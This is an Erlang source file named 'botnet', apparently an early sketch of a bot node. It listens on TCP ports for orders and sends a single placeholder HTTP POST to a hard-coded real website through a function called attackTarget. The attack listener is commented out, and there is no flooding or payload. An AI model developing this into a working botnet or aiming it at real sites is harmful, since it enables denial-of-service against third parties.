-module(botnet).
-export([connectionTestServer/1, do_recv/2, start/2, attackTarget/1, connectionTargetServer/1]).

connectionTestServer(Port) ->
    {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0}, 
                                        {active, false}]),
    {ok, Sock} = gen_tcp:accept(LSock),
    {ok, Bin} = do_recv(Sock, []),
    ok = gen_tcp:close(Sock),
    Bin.

connectionTargetServer(Port) ->
    {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0}, 
                                        {active, false}]),
    {ok, Sock} = gen_tcp:accept(LSock),
    {ok, Bin} = do_recv(Sock, []),
    attackTarget("http://www.google.pl"),
    ok = gen_tcp:close(Sock),
    Bin.

 attackTarget(TargetURI) ->
    ssl:start(),
    application:start(inets),
    httpc:request(post, {TargetURI, [], "application/x-www-form-urlencoded", "example=here&foo=bar"}, [], []).

do_recv(Sock, Bs) ->
    case gen_tcp:recv(Sock, 0) of
        {ok, B} ->
            do_recv(Sock, [Bs, B]);
        {error, closed} ->
            {ok, list_to_binary(Bs)}
    end.

start(TestPort, AttackOrderPort) ->
    A = spawn(botnet, connectionTestServer, [TestPort]),
    A.
    % spawn(botnet, connectionTargetServer, [AttackOrderPort]).